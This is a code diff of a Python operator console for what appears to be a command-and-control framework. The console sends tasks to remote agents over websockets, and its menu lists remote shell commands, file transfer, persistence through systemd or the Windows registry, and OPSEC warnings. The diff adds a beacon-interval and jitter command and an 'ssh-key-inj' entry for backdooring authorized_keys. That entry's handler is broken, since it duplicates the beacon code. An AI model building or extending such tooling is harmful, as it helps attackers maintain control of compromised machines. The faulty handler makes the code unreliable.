@@ -4,10 +4,14 @@ import readline #for semi shell interaction in input()
 import asyncio
 import json
 import websockets
+import sys
+
 
 from prompt_toolkit import PromptSession, print_formatted_text
 from prompt_toolkit.formatted_text import ANSI
 from prompt_toolkit.patch_stdout import patch_stdout
+from prompt_toolkit.shortcuts import clear
+
 
 #-----
 #### colors for printing #####
@@ -78,20 +82,26 @@ def all_actions(actions):
     - clear
 
     - sh <shell cmd>
+    - ch-beacon <seconds> [jitter%]
+        change agent polling interval by second
+        es. ch-beacon 3600 50 , make polling of 1h + jitter
+
     - upload <mypath> <agentpath>
     - download  <agentpath> <mypath>
 
-    - dir-sh
-        direct shell via ws [{RED}can lower your OPSEC{RESET}]
 
+    - ssh-key-inj <raw pub key>
+        injects your key in the ~/.ssh/authorized_keys file
+        
     - percistance 
         systemd, windows reg
         
               """)
     
 
-def clear():
-    print_formatted_text(ANSI("\033[2J\033[H" ))
+def my_clear():
+    clear()
+
 def command_not_fount():
     print_formatted_text(ANSI(f"-- [{RED}-{RESET}] command not found"))
 #-----
@@ -99,28 +109,16 @@ def command_not_fount():
 
 
 
-async def useMode_wsCom(websocket, action, agent_id, data):
-    # task queue
-    payload = {
-        "action": "queue_task",
-        "agent_id": agent_id,
-        "data": data
-    }
-    
-    await websocket.send(json.dumps(payload))
-    response_raw = await websocket.recv()
-    response = json.loads(response_raw)
-    
-    print_formatted_text(ANSI(f"\n[Server Response] :\n{response.get('output')}\n"))
+
 
 async def event_listener(event_url):
     try:
         print(f"\n[DEBUG] connect to channer events: {event_url}")
         async with websockets.connect(event_url) as ws:
-            print(f"[DEBUG] channel connected waiting for data")
+            print(f"[DEBUG] ")
             while True:
                 response_raw = await ws.recv()
-                print(f"[DEBUG] Ricevuto dal server eventi: {response_raw}")
+                print(f"[DEBUG] : {response_raw}")
                 
                 response = json.loads(response_raw)
                 if response.get("type") == "agent_output":
@@ -131,6 +129,10 @@ async def event_listener(event_url):
         print(f"\n{RED}[-] WebSocket closed form server: {e}{RESET}")
     except Exception as e:
         print(f"\n{RED}[-] ctical error in event_listener: {e}{RESET}")
+
+
+
+
 
 
 
@@ -155,7 +157,7 @@ async def use_agent(websocket, agent_id, session):
                 all_actions("use")
                 continue
             elif action == "clear":
-                clear()
+                my_clear()
                 continue
 
             elif action == "sh":
@@ -173,20 +175,58 @@ async def use_agent(websocket, agent_id, session):
                 await websocket.send(json.dumps(payload))
                 _ = await websocket.recv()
                 
-                print_formatted_text(ANSI(f"\n{BLUE}[*] Task queued. Output will arrive via background stream.{RESET}\n"))
+                print_formatted_text(ANSI(f"\n{BLUE}[*] Task queued. wait for output...{RESET}\n"))
                 continue
 
+            elif action == "ch-beacon":
+                if len(parts) < 2:
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify second and jitter (es. ch-beacon 60 10)"))
+                    continue
+                
+                interval = parts[1]
+                jitter = parts[2] if len(parts) > 2 else "0"
+                
+                payload = {
+                    "action": "update_beacon",
+                    "agent_id": agent_id,
+                    "interval": int(interval),
+                    "jitter": int(jitter)
+                }
+                await websocket.send(json.dumps(payload))
+                _ = await websocket.recv()
+                
+                print_formatted_text(ANSI(f"\n{GREEN}[+] Beacon updated: {interval}s (Jitter: {jitter}%){RESET}\n"))
+                continue
+            
+            elif action == "ssh-key-inj":
+                if len(parts) < 2:
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify seconds, jitter (es. ch-beacon 60 10)"))
+                    continue
+                
+                interval = parts[1]
+                jitter = parts[2] if len(parts) > 2 else "0"
+                
+                payload = {
+                    "action": "update_beacon",
+                    "agent_id": agent_id,
+                    "interval": int(interval),
+                    "jitter": int(jitter)
+                }
+                await websocket.send(json.dumps(payload))
+                _ = await websocket.recv()
+                
+                print_formatted_text(ANSI(f"\n{GREEN}[+] Beacon updated: {interval}s (Jitter: {jitter}%){RESET}\n"))
+                continue
+
+
+
             # elif action == "download":
-            #
-            #     await useMode_wsCom(websocket,action,agent_id)
             #     continue
             #
             # elif action == "upload":
-            #     await useMode_wsCom(websocket,action,agent_id)
             #     continue
             #
             # elif action == "percistance":
-            #     await useMode_wsCom(websocket,action,agent_id)
             #     continue
 
             else:
@@ -222,8 +262,10 @@ async def main(server_url, event_url):
                     if action == "help":
                         all_actions("main")
                         continue
+                    elif action == "exit":
+                        print("press ctrl + C to exit")
                     elif action == "clear":
-                        clear()
+                        my_clear()
                         continue
                     elif action == "build":
                         print("working on")
